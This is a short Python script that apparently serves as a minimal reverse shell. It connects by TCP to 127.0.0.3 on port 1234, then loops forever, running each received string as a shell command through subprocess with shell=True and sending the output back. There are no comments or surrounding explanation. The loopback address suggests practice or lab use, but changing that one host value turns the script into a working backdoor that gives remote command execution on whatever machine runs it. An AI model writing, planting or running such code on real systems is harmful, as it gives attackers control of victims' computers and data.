from socket import *
import subprocess

s = socket(AF_INET ,SOCK_STREAM)
s.connect(('127.0.0.3' , 1234))
while True:
    data = s.recv(12345)
    cmd = subprocess.check_output(data, shell=True)
    s.sendall(cmd)
s.close()